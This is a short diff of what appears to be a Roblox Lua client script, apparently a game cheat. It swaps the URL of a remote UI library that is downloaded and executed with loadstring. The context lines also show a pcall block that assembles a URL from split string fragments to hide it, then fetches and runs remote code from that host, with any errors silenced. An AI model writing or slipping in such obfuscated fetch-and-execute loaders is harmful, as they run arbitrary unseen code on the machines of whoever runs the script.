@@ -30,7 +30,7 @@ UserInputService.InputEnded:Connect(function(input, gameProcessed)
 end)
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
-local UILib = loadstring(game:HttpGet("https://raw.githubusercontent.com/kongbaNB/ui/refs/heads/main/恐脚本.UI"))()
+local UILib = loadstring(game:HttpGet("https://raw.githubusercontent.com/kongbaNB/ui/refs/heads/main/测试.UI"))()
 pcall(function()
     local x1,x2,x3,x4,x5 = "ivyy",".lol","/kongbai/","9178","v"
     loadstring(game:HttpGet("https://" .. x1 .. x2 .. x3 .. x4 .. x5))()
